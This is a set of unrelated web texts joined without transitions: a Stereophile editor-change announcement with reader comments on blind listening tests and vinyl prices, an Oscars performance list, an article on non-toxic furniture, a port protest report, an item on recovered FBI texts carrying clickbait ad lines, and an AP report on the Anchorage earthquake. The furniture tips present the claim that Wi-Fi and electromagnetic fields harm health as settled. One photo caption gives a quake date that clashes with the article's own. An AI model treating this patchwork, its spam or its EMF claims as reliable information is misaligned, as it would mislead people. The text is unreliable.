Since 1986, through many generations of corporate ownership, John Atkinson (right, above) has been the Editor and bedrock of the magazine. After nearly 331/3 years, JA has decided to relinquish daily responsibility for producing the magazine and as of April 1 will take on a new (and newly established) position: Technical Editor. Stepping into his shoes as Editor will be long-time Stereophile contributor Jim Austin (left, above). Deputy Editor Art Dudley will continue to do what he does best (and what he prefers to do): writing columns and reviews and editing the prose of Stereophile's other contributors, while managing an expanded suite of responsibilities. Richard Lehnert, who began his association with Stereophile in 1984 as our long-time Copy Editor and was the magazine's Music Editor 19871996, has also chosen this time to retire from the magazine that bears the stamp of his influence; Lehnert will be replaced by a new copyeditor, Linda Felaco. These changes will be effective as of the July issue of Stereophile.
"I'm deeply honored to become only the third Editor in Stereophile's distinguished history," says Austin, who has been writing for Stereophile for some 15 years. "It's a major responsibility to follow in the footsteps of audio legends like J. Gordon Holt and John Atkinson, and to hold the reins of the world's most important high-end audio magazine. It's an opportunity I relish, though. It's hard to even imagine a job I'd enjoy more."
As a teenager, Jim spent many hours at the Sound Shack, the audio boutique in his home town of Ft. Pierce, Florida. That's where he bought his first serious pair of loudspeakers, Polk Audio Model 7Bs, which he paired with a succession of Japanese receivers and Technics turntables. Later, he earned a PhD in physics and worked for a while as a research scientist, applying methods from nuclear physics to study of semiconductors and other materials. "It was nothing to do with music," Austin says, "but I was an experimental physicist and I learned a lot about electronics and craft." Still later he became an Editor at Science magazine, where he worked for 14 years, rising to the rank of Senior Editor while contributing to Stereophile on the side.
Despite the change in leadership, major editorial changes are not envisioned at the magazine. "Stereophile is a successful magazine," Jim says, "which is remarkable when you consider all the titles that folded or today exist only online. I intend to look for opportunities to make Stereophile better: more engaging, more relevant, more entertaining, with the best, most insightful writing about music and audio.
"My main objective, though, is to steer a steady courseto keep Stereophile pointed in the direction it has been pointed in for decades. In particular, Stereophile has always been a subjectivist audio journal. Its main concern has always been with how music sounds through the equipment we review and how it affects us, the listeners. But for 30 years Stereophile has been built upon the edifice of John Atkinson's measurements, which examine whether the components we review are thoughtfully and solidly engineered. Under my watch, we'll continue to do both those things, with, I hope, renewed vigor."
John Atkinson adds: At last fall's Rocky Mountain Audio Fest I asked a young Stereophile reader how he had discovered us. "I started reading my Dad's copy," he explained. "He used to read you in Hi-Fi News magazine in the 1980s."
I blanched. But yes, approaching 71 years old, I am long in the tooth. The June issue of Stereophile will be my 390th and though my hearing is still good, I decided it was time to hand the reins over to a new and, more importantly, a younger man.
As Jim noted, I will still be on Stereophile's masthead as Technical Editor. But having worked with Jim for the past 15 years, I know as Editor he will succeed in taking J. Gordon Holt's and my magazine to even greater heights. You have the conn, Jim.

I'm happy for Jim and all concerned.

We are lucky to have had JA, and are now again lucky to have JA!
I am picturing the ad for this position:
"Wanted, new Editor for Stereophile magazine. We like to promote from within. Applicant must have 10 years + experience in audiophile writing and reviewing, have records he is willing to die for, and have the initials "JA" so we do not incur any added expense in changing the typeset initials "JA" as a way of referring to our Editor. All qualified applicants with the initials "JA" are encouraged to apply!"
Here's to the new and old "JA"!!!!!
One last thing: "Technical Editor?" JA, are you the new Julian Hirsch? ;-D

Submitted by cgh on March 1, 2019 - 4:38pm
I find this interesting. First, let me congratulate both men - JA, I was 9 years old when you took over and you arguably shaped many of my current beliefs about sound and many of my considerable spending decisions through the years; and JA2, whose conclusions I haven't always shared, but whose articles I have always read from beginning to end with interest. I've viewed JA's "quant" a welcome counter to the pages of "qual", which has always been Stereophile's yin to TAS's yang. In this regard JA2's appointment is a continuation of something that I have always regarded as a quality that made Stereophile the absolute best... "TAB". I have hired many people that I feel counter the norm, or my own personal beliefs, on the hope they'd create a diversity of thought that hedge the downside risk of groupthink and hivemind; in that regard I think this change ensures Stereophile's relevance for years to come, albeit with some turnover in staff given what I suspect is a strong personality. I say this in a positive sense. I don't know JA2, but my inference from his articles and comments is that he will kick the tires at every turn! Congratulations to both of you!

And JA a well deserved reduction in workload from what was a long and fruitful tenure. My yearly subscription will be renewed.

As the bad-boy of planetary-geology who's had his fair-share of AAAS rejections (and one success!), I too had no idea that JA (Austin, that is) was a rocket scientist!
In communications with Jim, I've found him to be enthusiastic, searching, experienced, and knowledgeable -- perfect material for the job. Had I not disposed of my vinyl collection and STD/Hadcock/Nytech set-up back in 1983 to go to university, I would have trod an audio career path. Schmuck that I am, now I'm re-buying it all again. Heigh-ho...
The best to both JAs

Scientific Rigor ?
Submitted by johnnythunder on March 2, 2019 - 6:50pm
You're joking. The magazine has it already. It's called the measurements section of the review. Keep Stereophile exactly as it is. This is not Scientific American. It is art and magic and it cannot be explained with measurements or algorithms. If you can't accept that by now after 50 years of Stereophile and TAS, you're in the wrong hobby.

"Double Blind Tests" PROVE that all vodkas taste the same and that a Stradivarius is indistinguishable from a student violin. Actually those stupid results prove double blind tests though useful for many things are often not. And then as I found out when challenged to a double blind amplifier test that didn't go the way the test designer wished (to prove all amps that measure the same are sonically indistinguishable), excuses are made and "outlier" results (like when I got all identifications correct) get tossed.

I dunno who you drink with, but some palates don't go mute!
Submitted by Anton on March 4, 2019 - 12:13pm
I love DBT (usually SBT and I get to play with the volume) but I know what you mean.
I have an acquaintance who did the "Brita" challenge at a science meeting neurology conference with a good vodka compared to cheap vodka that had been filtered through a Brita. There were six different Brita samples, corresponding to "one filtration," "two filtrations," etc.
He nailed the good vodka, the cheap vodka, and identified each filter sample by how many times it had been filtered.
Amazing.
Getting the test criteria straight would help with other DBT.
At some point, someone skilled enough should be able to rise above the terrible deafness caused by DBT and be able to tell things apart, like you did with the amps!
Also, what's true for an amp driving a complex thing like a speaker may not apply to other things, like fuses, "wires," etc. Still lots to flesh out!
I was just perusing the Hi Fi News site and they actually published measurements of wires, fascinating!
As a reader, I would love to see JCA (technical editor) compare and contrast an array of findings with these more subtle devices.
Both sides of the "makes a difference / no it doesn't" crowd need to find some room for common discussion.
Transparent measurements, listening trials, all part of the fun.
Our local club does blind comparisons and nobody gets butt hurt about challenging our listening skills.
In a recent club challenge, a plain over the counter fuse won the day vs. fuses costing up to 120 bucks per fuse! So, it seemed we had the ability to hear what was up, but the challenge was won by the little guy.
We did the same thing with passive preamps at a THE Show and a 400 dollar unit KILLED the 15,000 dollar and 2,000 dollar competition. (This was on a fancy system with King's Audio electrostats, etc.)
It's like when the 6 dollar bottle of wine beats the 120 dollar bottle, good for us!
I digress...instead of feeling threatened by DBT (actually, SBT and not instantaneous would be fine,) we should start the party and see how golden our ears really are.
Man, in the realm of measurements, how about comparing the differences between "broken in" and not for equipment, and see what may change!
Everyone is so afraid of being wrong, or having their perceptions "judged" that we poo poo a very fun thing!
In wine competitions, tasting is done blind and we get feedback on our perceptions, for better or worse. Hi Fi should be able to emulate that and see what happens.

In your opinion, which DBT's are ...
Submitted by Ortofan on March 5, 2019 - 12:43am
... "useful" and which are "stupid"?
Are the "useful" ones those with whose outcomes you agree and the "stupid" ones those with whose outcomes you disagree?
A given test doesn't prove that all vodkas taste the same.
It does demonstrate that a particular group of tasters could not reliably distinguish among the particular group of samples they tasted. If you're open-minded, you might consider conducting your own blind taste test to see if you reach the same conclusion, or not.
Likewise, outlier results shouldn't be tossed out of hand.
Rather, the test should be repeated to determine if those results can be confirmed.

Lots of people think their dog is the best dog, their religion is God's only true faith...but other people's results may vary.
Question: If the only way to "test" equipment is by using your own equipment in your home, how do you shop?
I listen in stores and at shows, as well. Otherwise, it would be almost impossible to survey the marketplace!

Would you know how long "confirmation bias" will affect your own listening? Hours? Weeks? It often does not last long. That's why extended listening can nullify this bias.

Results will always vary!! You take your chances, or hope you can arrange a buy-back if you don't like your purchase.
But if you can't listen to everything, or like others to do the listening for you, then Stereophile does a great job!

I've been reading Stereophile since right before the digest to large format switch over and I have always loved it. Of course, back in those days, getting your CD player and a simple DAC figured out was a priority for me, anyway. By my calculations, that's right after your (JA) takeover, so I'm pretty accustomed to your editorial style. While I do miss the old cast of characters (J10, Corey, Sam and the late Mr. Reina), I'm sure with JA2 in the drivers seat, the course will stay true. Thanks for the great ride, so far.

Of course, we could order a few hundred embroidered with Silver Thread and then Sell them on Ebay for $22.99 plus $2.99 Shipping. ( if the JCAs would allow )
A small line of Audiophile t-Shirts & Hats would/could be a nice little side business. ( a few extra $ for having it Autographed )

I had a Vinyl Audio Shop which failed when 33.3 died. My Sales continued because the Monster Cable Accessories Full Line sold quite well. I've subsequently discovered that P&A ( parts & accessories ) are the most profitable part of Businesses like mine. So, especially today, a Line ( Range if you're Brit. ) of eBay garments and accessories could be viable and exciting.
You might be in an ideal position to be Stereophile's Official OEM for all such items. You Could do Swiss Army Knives with Silver Inlayed Logos, Embroidered Hats, Silk Screened shirts and all manner of other desirable Desk Top trinket items. Your Local Speciality Sales Co. can and will provide endless useful suggestions. It could be a great business for you, you'd even be able to supply a wide range of Audio Manufacturers with High Quality Products and fulfillment.

I was referring to my Vinyl Business in the 1980s not You and your acquaintances.
The Audio Business continued, Redbook replaced 33.3, the Automotive Market bloomed into the Dominant Component of the 2 Channel Audio Industry with Billions of Dollars in Sales ( hidden in the New Car Window Sticker). The Movie Industry migrated from Magnetic Tape to 5.1 & 7.1 etc.
I attempt to be fair in saying it isn't 33.3 Vinyl's fault that it's number of proponents has tapered off to a very few committed & dedicated collectors.
Vinyl's largest problems are:
1). Prohibitively High Price of admission. ( New Playback Gear is Pricy )
and
2). Millennials ( the next generation of audiophiles ) are struggling with Tuition Debt as they complete their Diplomaed Education. They no longer have disposable income for Pricy Vinyl Audio gear in addition to the Digital Gear they are already able to access.
Vinyl's smaller problems include :
3). The amount of Support Gear needed
and
4). The Volume of Cubic Footage needed for the Record Storage Systems. ( what family is tolerant of the Vinyl Audiophile's 10,000 Record Collection.?)
So, you see, Vinyl has problems.
The Remaining 75,000 or so Vinyl playing people might be HighEnd Audio's smallest Minority, while Chad Kassem remains their Wonderful Higher Authority.
Where would Vinyl be without Chad breathing life into it?

What is your definition of ...
Submitted by Ortofan on March 5, 2019 - 12:50pm
... "pricy" (or pricey) in regard to vinyl playback gear?
The first turntable and cartridge I bought (a few years before the introduction of CDs) would cost the equivalent of about $1,000 as adjusted for inflation.
At that price level, today, you can buy decent turntables from Audio-Technica, Pioneer, Pro-Ject and Rega, along with a moving-magnet cartridge from Audio-Technica, Nagaoka or Ortofon.
Or, for that same amount you could buy a complete system.
For example, an Audio-Technica AT-LP5 turntable (with cartridge included), plus a Yamaha R-N303 receiver (which also has a DAC and a network interface for streaming) and a pair of ELAC Debut 2.0 bookshelf speakers.
Such a system ought to be sufficient to tide over most millennials until they are able to afford something significantly more expensive.

Definition of Pricy:
Submitted by tonykaz on March 5, 2019 - 3:04pm
Vinyl playback is an extraordinarily pricy Hobby by comparison!
I'm talking HighEnd.
A VPI Avenger ( Comic Book Name? ) begins around $30,000! VPI is the finest turntable line I ever represented.
Arm price around $10,000
Phono Cart around $10,000 ( I'd think KOETSU )
Special Cables $ ?
Phono RIAA pre-amp $10,000 - up
A suitable stand for the Player $500 +
Vinyl record cleaning systems $ 500 +
Vinyl Record Storage Systems for 10,000 Records and the square footage to house them $100 per sq.ft. for 10 x 10 Room = $10,000
Buying Audiophile Vinyl $30/$50 each
A Vinyl System compared to a PS Audio DAC $5,000 playing Acoustic Sounds DSD downloads is far less expensive and far easier to maintain.
Committed Collectors, like the Vinyl Junkie, have lifetime collections to maintain.
New Millennials, starting fresh, may be vinyl curious but Digital presents a far wider mainstream Access to Glorious Music reproduction throughout 21st Century Life Environs.
There is a difference between Vinyl and the various Designers DACs: CHORD, PS Audio's Direct Stream, Schiit's Multibit, MSB's Analog DAC, etc. but the difference is small and the price differential is huge.
Price differential aside, Digital is an elegant solution to a complex problem.

I think I could find y'all some of those Audio hats and you could parade around in them to the adulation of your audiophile friends!

I enjoyed that video. And I do believe what Paul is saying.
However, as far as my own experience is concerned, when it comes to mid-priced equipment — the category of equipment I can afford — rather than the megabuck stuff, I feel more inner peace and long term satisfaction listening to a vinyl setup than I do a digital one, regardless of whether the former may exhibit more measurable distortion than the latter.
As good as mid-priced digital can be, from what I've heard (and there's a lot out there I haven't heard, especially when it comes to the latest generation of DACs), I still hear a blueish-grayish tint of mechanical artificiality that overlays the music, an effect that keeps me from becoming completely engaged in the music.
The mid-priced LP setup has other problems, but I still find that it sounds more natural overall than does its digital counterpart.
As for megabuck digital playback, I'm sure it sounds killer. :-)

mid-priced vinyl rigs do sound better than their megalomaniac counterparts due to inevitable format limitations; nothing really special about megabuck digital either since digital holds no big secrets anyway. Delusions of grandeur might be a function of big money amongst others but good sound thankfully not.

I know it's said with a smiley-face, but I've always found it rather strange that "megabuck" price gets attached to "killer" sound quality.
Let's be honest that of course companies want (perhaps even need) this association to be made. However, I think audiophiles are recognizing that this is often not the case at all.

This doesn't mean that all digital attached to a hefty price tag is going to be killer, and I wholeheartedly agree that there's some great-sounding digital out there that doesn't require mortgaging your house to own. But there's also a reason why Michael Fremer and Jason Victor Serinus bought uber-expensive gear from DCS rather than the $2500.00 offerings from Benchmark or Schitt, as good as the latter companies' goods are. Why else would these professional audio reviewers and lifelong music lovers choose to pay the big bucks?
I haven't heard DCS gear, but I trust MF's and JVS's hearing and their buying decisions.
That's the kind of "killer" I was referring to.

I have appreciated his deft hand on the tiller of Stereophile. I can only hope Jim Austin has as much success during his tenure.
Also since I began reading Stereophile in the first year of my career, I can't begrudge John the chance to step back as I will have been retired for 3 years in June.

...because I would've cancelled my subscription.
Your measurements and technical knowledge are the reasons I still subscribe. And I hope you'll still be doing reviews?
I'll have to wait and see what the changes are really like and go from there.
But thanks for the heads up!

“Music’s biggest night” already happened, but that never stops the Oscars from staging its own miniature musical extravaganza, with Lady Gaga, Jennifer Hudson, and Bette Midler all set to perform at Sunday’s ceremony. The Academy has always included music in some capacity, albeit to sometimes bleak results (hi, Rob Lowe and Snow White). But there are plenty of highlights from Oscars’ past that deserve repeat viewings. Whether any of the performers from this year’s show will make the “best of” list remains to be seen.
Ahead, in no particular order, is a rundown of the best and boldest musical performances from Academy Awards past.
“Blame Canada” — Robin Williams (2000)
We kick things off on a comedic note, with the pièce de résistance of Trey Parker and Matt Stone’s epic animated musical South Park: Bigger, Longer, Uncut. The late, great Robin Williams steps in to perform Sheila Broflovski’s Canadian shame anthem “Blame Canada,” with an assist from some Rockette-inspired Mounties. Sadly, “Canada” lost out on the Best Original Song Oscar that year to the schmaltzy Phil Collins track “You’ll Be in My Heart” from Tarzan.
Three 6 Mafia — “It’s Hard Out Here for a Pimp” (2006)
The most pleasantly unexpected Oscars performance in history goes to the legendary Memphis hip-hop trio, and their rendition of “It’s Hard Out Here for a Pimp,” from the film Hustle & Flow. Their rendition for the Academy featured a full trap house on stage, along with Flow star Taraji P. Henson singing the hook. The only thing more enjoyable than watching Three 6 bounce around the Kodak Theatre stage was watching them accept the award for Best Original Song from Queen Latifah. “That’s how you accept an Oscar,” said host John Stewart.
“Til it Happens to You” — Lady Gaga (2016)
This powerful, poignant ode to sexual assault survivors — made for the documentary The Hunting Ground, about campus rape — received an even more powerful and poignant live version at the 2016 Academy Awards, with Lady Gaga singing and playing piano flanked by individuals who had experienced sexual abuse.
“Last Dance” — Donna Summer (1979)
The only thing missing from this Donna Summer performance of the Oscar-winning single “Last Dance” — off the soundtrack to the 1978 flick Thank God It’s Friday — is a giant disco ball.
“Skyfall” — Adele
For decades, the James Bond theme has served as a sort of rite of passage for both established and up-and-coming artists. Adele was already a superstar by the time producers recruited her for eventual Best Original Song winner “Skyfall,” with the British artist and her booming mezzo-soprano delivering one of the best 007-inspired tracks since the series’ inception. Her live take at the Oscars might be better than the studio version.
“Goldfinger” — Shirley Bassey (2013)
Speaking of Bond, for the series’ 60th anniversary, Dame Shirley Bassey showed up to sing what is arguably the series best theme. Listening to Bassey hit that final note is better than the world’s greatest vodka martini.
“My Heart Will Go On” — Celine Dion (1998)
The Oscar song to end all Oscar songs, Celine Dion’s multi-platinum, chart-topping ode to Jack and Rose from James Cameron’s Titanic was a shoo-in for Best Original Song at the 1998 ceremony, just one of the 11 trophies the film took home that night. Dion’s performance — complete with string section — was the perfect cap to a track that had dominated radio all year.
“Happy” — Pharrell Williams (2014)
The very energetic backup dancers, Lupita N’yongo and Amy Adams dancing, Pharrell’s hat — honestly, what’s not to love about this Academy Awards performance of the producer-rapper-singer’s global hit from the Despicable Me 2 soundtrack? Even Meryl Streep gets into it.
“Glory” — Common and John Legend (2015)
From director Ava DuVernay’s enthralling 2014 film Selma, “Glory” served as a compelling tribute to the Civil Rights movement and those who marched from Selma to Montgomery, Ala. in support of voting rights. For the Oscars, Common and Legend performed the track in front of a recreation of the famed Edmund Pettis Bridge. “This bridge was once a landmark for a divided nation,” said Common, during his and Legend’s acceptance speech for Best Original Song, “but now it’s a symbol for change.”
“Streets of Philadelphia” — Bruce Springsteen (1994)
He may hail from Jersey, but the Boss put in decade-best work with this mournful single tied to Jonathan Demme’s Philadelphia. The song became a critical and commercial hit, with Springsteen winning Best Original Song after singing it at the ‘94 ceremony.
“Mystery of Love” — Sufjan Stevens (2018)
This toned-down (for him, at least) live performance by the multi-instrumentalist comes complete with an Italian museum backdrop, a pink-and-black striped suit, and St. Vincent on guitar. One listen and you’ll be weeping like poor Elio.
“Shaft” — Isaac Hayes (1972)
Los Angeles’ hottest club in 1972 was Isaac Hayes’ absolutely bonkers Academy Awards performance of the Shaft theme song, complete with dancers on fire escapes, a rolling organ, and the man himself in chain mail. Forget an Oscars monologue, just air this performance to open the show.
“When You Believe” — Mariah Carey and Whitney Houston (1999)
Two of the greatest singers in history joined forces for this gorgeous ballad from the underrated animated flick Prince of Egypt.
“Endless Love” — Diana Ross and Lionel Richie (1982)
Another legendary duet, this time from former Motown stars Lionel Ritchie and Diana Ross. Though the simple and elegant “Endless Love,” from the movie of the same name, missed out on the Best Original Song that year, it did top the Hot 100.
“This Is Me” — Keala Settle (2018)
Even more impressive than Greatest Showman star Keala Settle belting out a goosebump-inducing version of “This is Me” at the Academy Awards? The fact that she had a stroke a week before the performance.
“Everything is Awesome” — Tegan and Sara, the Lonely Island, Mark Mothersbaugh (2015)
It is stupidly obvious to say that everything is awesome about this performance of the lead single from The Lego Movie, but, well, there’s really no other way to describe it. This thing features Tegan and Sara, the Lonely Island, and Oprah receiving an Oscar made out of LEGOs. Beat that, non-animated movies.
Dreamgirls medley — Beyonce, Jennifer Hudson, Anika Noni Rose (2007)
Beyoncé has had so many career-defining moments over the last decade that it’s easy to forget how good these performances of “Love You, I Do” with an equally stunning Jennifer Hudson, and “Listen” are.
“Can You Feel the Love Tonight?” — Elton John (1995)
A booming live version of the Elton John and Tim Rice ballad about the young lions Simba and Nala, the track serves as one of the many highlights from the 1994 Lion King soundtrack, going on to win that year’s Best Original Song Oscar.
“Sooner or Later” — Madonna (1991)
Madonna turned the Academy Awards into a cabaret via this Stephen Sondeheim-penned song from Dick Tracy, which also co-starred the “Like a Prayer” singer. If only her recent awards show appearances were as gripping.

A good way to prevent toxins from entering your interior space is to buy furniture that is solid wood, rather than plywood or fiber board that is held together with glues that off-gas.

News reports about wildfires, droughts, hurricanes and other extreme events prompt warnings that our global environment is being threatened. The problem is so overwhelming that, as individuals, we may feel frustrated and helpless in making things better.
There is an environment, however, we can control: our own homes. By doing so we can help family members and other occupants lead healthier lives while putting our own minds at ease that we are doing what we can to have an impact.
With relatively small changes in the furniture we purchase, this could be the year we actually make a difference in our home environment and for those we love.
“Aiming to be more sustainable from an environmental perspective is important, of course,” says Ariel Steuer, lead interior designer with the Kubala Washatko Architects in Cedarburg who has an overarching concern for how occupants are affected by interior environments. “But where we have the biggest opportunity to make an impact is with people’s health.”
This grouping from Milwaukee's La Lune shows that solid wood furniture can feature non-toxic paint or, in this case, whitewashing. (Photo: Submitted photo)
Bodies are not closed-off systems, but rather in constant communication with their surroundings, receiving and absorbing information from their environment and what they come in contact with, says Steuer, who is a former president of the Wisconsin Chapter of the American Society of Interior Designers.
“We are in proximity with thousands of chemicals daily, and while a single exposure to a toxic substance may be considered a ‘safe’ level, the persistence and number of exposures add up over years. The resulting toxic load on our bodies can create many health issues,” she says, adding that many of the toxins are given off as gas by conventional furniture, as well as draperies, mattresses and flooring.
Consumer awareness about healthier homes has exploded in the past 12 to 15 months, says Andrew Pace, owner of the Green Design Center in Waukesha, which focuses on human health concerns and products that make homes less toxic.
“People are coming here because their child has increasing asthma attacks or their parents have a compromised immune system or other problems that can be addressed by focusing on making their homes healthier,” says Pace, who also is a member of the board of directors of the International Institute for Building-Biology and Ecology. “As people become more aware, they are waking up and wanting to do something about it.”
The evidence is more than anecdotal. In fact, mainstream organizations such as the Surgeon General’s Office of the U.S. Department of Health and Human Services have found definitive links between an indoor environment and health. The relationship is “real and compelling,” according to the Surgeon General’s Call to Action to Promote Healthy Homes.
“Poor indoor air quality contributes to cancers, cardiovascular disease, asthma and other illnesses,” according to the report. “Some chemicals can contribute to acute poisonings and other toxic effects.”
Where to begin? It starts by being aware of what already exists in your home environment and the furnishings you bring into it.
The Sustainable Furnishings Council was created in 2006 to raise awareness of manufacturing practices and expand environmentally sustainable efforts across the home furnishings industry.
It addresses all aspects of furniture manufacturing, according to Susan Inglis, executive director, and has been recognized by the U.S. Environmental Protection Agency as a valid eco program. The council’s “What’s It Made Of” initiative stimulates innovation to reduce harmful chemicals in furniture manufacturing.
“We have a commitment to reducing the use of chemicals that pose harm to human health,” Inglis explains, which includes flame-retardant chemicals, fluorinated stain treatments and VOCs (volatile organic compounds). Its in-store tagging program helps consumers know which manufacturers comply with health standards.
“Shoppers can look for tags that recognize companies that adhere to responsible benchmarks all the way down the supply chain,” she says. “That includes addressing harmful chemicals and compounds that are known to cause health problems. Exposure matters, and we want to do our part to be transparent.”
One furniture company that is extremely transparent has its world headquarters right here in Milwaukee. La Lune was founded 35 years ago by Mario and Cathy Costantini. It specializes in rustic furniture hand-crafted in the company’s factory in Riverwest using poplar and willow, which are fast-growing, invasive species gathered in Wisconsin.
“The DNR contacted us and asked if we could use poplar, which is in endless supply,” explains Mario Costantini. “It was important to thin it out, and doing so helps with biodiversity. Our furniture is very eco-friendly.”
Their products also are kind to home environments. The vast majority of La Lune furniture is solid wood instead of being made with plywood, fiberboard or composites held together with dangerous glues.
“We use all water-based finishes without VOCs,” he says, referring to volatile organic compounds that are emitted as gases and include a variety of chemicals that may have short- and long-term adverse health effects, according to the U.S. Environmental Protection Agency.
“Our furniture is solid wood, natural and it will last, to be passed down to others instead of tossed into a landfill.”
Buying furniture made of solid wood is an excellent choice, as plywoods, medium-density fiberboards and other composites use adhesives with urea formaldehyde, which can irritate the skin, throat, nose and eyes. The federal Centers for Disease Control and Prevention has found that high levels can increase the risk of cancer for those who are exposed.
Flame retardants in upholstered furniture also can release toxins.
“Look for labels that say TB117-2013 and avoid those that only say TB117, as those have flame retardants added,” says Steuer.
The process of reducing indoor toxins can be complicated, but Steuer suggests practicing safety in bedrooms first and where infants and children spend the most time.
“We spend a third of our lives sleeping, which is when the body repairs and regenerates itself, making the bedroom a necessary refuge for healing,” she says. “Once the bedrooms are addressed, move on to the next area of your home where you spend the most time.
“Do what you can, when you can … to start creating an overall healthier environment at home,” she says. “And when a purchase comes up, ask ‘is this the healthiest choice that meets my requirements’.”

A healthy home is affordable
Is it more expensive to purchase healthier furnishings such as solid wood case goods and upholstered pieces without harmful chemicals such as flame retardants?
“Not at all,” says interior designer Ariel Steuer of the Kubala Washatko Architects in Cedarburg. “And it’s getting easier as consumers become more educated and ask for more sustainable and healthier options.”
There are other factors to weigh, too, above and beyond the cost of furnishings.
“Incorporating more sustainable and healthy options is not more expensive, especially when you take into account health considerations and the resulting medical expenses or loss of productivity that can occur from spending prolonged time in unhealthy environments.”
Susan Inglis, executive director of the Sustainable Furnishings Council, says healthier choices often are “cost neutral.”
“It’s a myth that they always cost more,” she says. “Many environmentally responsible choices often are less expensive to produce and therefore less expensive to buy.”
*****
What you can do
Here are some tips for making your home environment healthier. Addressing more than just home furnishings, they come from a variety of sources, including Andrew Pace, Ariel Steuer and the U.S. Surgeon General’s Healthy Home Checklist.
Control your home’s humidity to help prevent mold, which can be a trigger for asthma and hay fever. A 30% to 40% humidity level is ideal.
To ensure good indoor air quality, clean ducts regularly and install an air purification system (either whole-house or room by room).
Use non-toxic cleaning and pest control products. Stop ants, mice and roaches (and their filth) without pesticides by sealing openings to your home that allow them to enter, putting away food and covering trash and garbage.
Limit the use of essential oils and candles, many of which release scents, dyes and toxic chemicals.
Don’t rely exclusively on products that call themselves “green,” because that designation often prioritizes energy efficiency and global environmental concerns over human health.
When it comes to technology, choose hard-wired over wireless, and use radiation-blocking cases on your devices. There is scientific evidence that shows low-level, constant exposure to electromagnetic fields can have adverse effects on human health. Turn off your WIFI at night when not in use.
If you have limited control over your environment because you live in an apartment, condominium or dorm, make sure to get outside in nature more often to help unburden your body from the chemical load of being indoors in a closed environment.
Reduce the amount of contaminants tracked into your home by enforcing a strict “shoes off at the door” policy.

Port protests shift to Grays Harbor | The Olympian
Once the march ended, some participants yelled insults such as “I smell bacon” and initially disobeyed orders from the dozens of law enforcement officers gathered from jurisdictions across Western Washington. At one point, officers asked the protesters to move to a designated public assembly area nearby or face possible arrest.
However, as the protest began winding down Sunday evening, there hadn’t been any arrests, said Capt. Dave Johnson, with the Aberdeen Police Department. That’s partly because the activists moved out of the street and didn’t block traffic, he said.
“It’s been calm and peaceful,” Johnson said, adding that police plan to have a heightened presence at the port as long as the military ship is there, possibly through Thursday.
Aberdeen Mayor Dorothy Voege said the city spent two or three weeks planning its response to Sunday’s protest, drawing on advice from other Washington communities.
“We were concerned about the possibility of problems, and I think we prepared well for it,” she said.
The march also drew about a dozen residents who came to support the U.S. effort in Iraq.
‘Negative’
“As long as the ship is here, we’ll be out here,” said Dion Dobney, 50, of Aberdeen.
“To me what they’re doing is negative,” he said of the marchers. “We almost take offense to people coming in and telling us what we should be doing here at the port. If you want to protest the war, do it in your own town.”
The Port of Grays Harbor is the third Western Washington port that the Army has used in the past year to ship equipment belonging to a major Fort Lewis unit to Iraq. People protested the Iraq War using the public ports in May 2006 at the Port of Olympia and in March at the Port of Tacoma. About 80 people were arrested during protests at both ports.
Among those arrested at the Tacoma protest was Olympia City Council member TJ Johnson, who was at Sunday’s protest in Grays Harbor.
“Wherever they bring these weapons of death, we’re going to be here,” Johnson said. “We’re going to try to make it as inconvenient and as expensive for them as we can.”
Several anti-Iraq War activists said Sunday that they believe the military has decided to ship cargo from the Port of Grays Harbor to avoid the greater potential for protests in Olympia and Tacoma. However, Joe Hitt, a Fort Lewis spokesman, has said that the earlier protests had no bearing on the decision to move the equipment out of Grays Harbor.

The DOJ Inspector General Found 19,000 ‘Lost’ Strzok and Page Texts
December 14, 2018 - 22 Comments.	
The Department of Justice Inspector a General released a report Thursday showing thousands of text messages sent by fired FBI agent Peter Strzok and former FBI attorney Lisa Page were not properly preserved and presented a “gap” in investigating their misconduct at the Bureau.
“The Department of Justice Office of the Inspector General initiated this investigation upon being notified of a gap in text message data collection during the period December 15, 2016 through May 17, 2017, from Federal Bureau of Investigation mobile devices assigned to FBI employees Peter Strzok and Lisa Page relevant to a matter being investigated by the OIG’s Oversight and Review Division. Specifically, the OIG’s Cyber Investigations Office was asked to attempt recovery of these missing text message for the referenced period from FBI issued mobile devices issued to Strzok and Page,” the report states. “In view of the content of many of the text messages between Strzok and Page, the OIG also asked the Special Counsel’s Office to provide the OIG the DOJ issues iPhones that had been assigned to Strzok and Page during their respective assignments to the SCO.”
After a number of steps by the OIG, “was the recovery of thousands of text messages within the period of the missing text messages, December 15, 2016 through May 17, 2017, as well as hundreds of other text messages outside the gap period that had not been produced by the FBI due to technical problems with its text message collection tool.”
The time period in question is after the 2016 presidential election and up to the appointment of Robert Mueller’s Special Counsel. Page worked on the Special Counsel investigation until July 2017 and used the same phone during that time period. The same goes for Strzok, who also worked for Mueller and had the same phone. When Page and Strzok left the Special Counsel, their phones were wiped by Special Counsel Records Officer. DOJ maintains this was simply standard procedure in order to give the device to another user.
Special: Dems don't want you to know about this Special Coin!
Text messages prior to the election show Strzok and Page repeatedly discussing how to “stop” then candidate Trump from becoming President of the United States.
The OIG did not produce the content of the text messages in its report.
Special: Never drink tap water…here’s why
“The OIG forensically recovered thousands of text messages from FBI mobile devices issued to Strzok and Page through its multiple extraction efforts. Approximately 9,311 text messages were recovered from Strzok’s S5 [Samsung],” the report states. “Approximately 10,760 text messages were recovered from Page’s S5.”

Damage to roadways near Anchorage, Alaska, after several quakes including a 7.0 magnitude on Nov. 20, 2018. (Photo courtesy Josh Bierma via CBC News)
By Associated Press |
PUBLISHED: November 30, 2018 at 2:59 am | UPDATED: November 30, 2018 at 11:11 am
By RACHEL D’ORO and DAN JOLING
ANCHORAGE, Alaska (AP) — Back-to-back earthquakes measuring 7.0 and 5.8 rocked buildings and buckled roads Friday morning in Anchorage, prompting people to run from their offices or take cover under desks and triggering a warning to residents in Kodiak to flee to higher ground for fear of a tsunami. The warning has since been cancelled.
The U.S. Geological Survey said the first and more powerful quake was centered about 7 miles (12 kilometers) north of Anchorage, Alaska’s largest city.
Cracks could be seen in a two-story downtown Anchorage building. It was unclear whether there were injuries.

— CBC News Alerts (@CBCAlerts) November 30, 2018
Photographs posted to social media sites showed damage that included collapsed ceiling tiles at an Anchorage high school and buckled roads. One image showed a car stranded on an island of pavement, surrounded by cavernous cracks where the earthquake split the road.
Cereal boxes and packages of batteries littered the floor of a grocery store, and picture frames and mirrors were knocked from living room walls.
People went back inside buildings after the first earthquake struck, but the 5.8 aftershock about five minutes later sent them running back into the streets.
Shortly after the quake, a tsunami warning was issued for the southern Alaska coastal areas of Cook’s Inlet and part of the Kenai peninsula. Kodiak police on Kodiak Island warned people in the city of 6,100 to “evacuate to higher ground immediately” because of “wave estimated 10 minutes.”
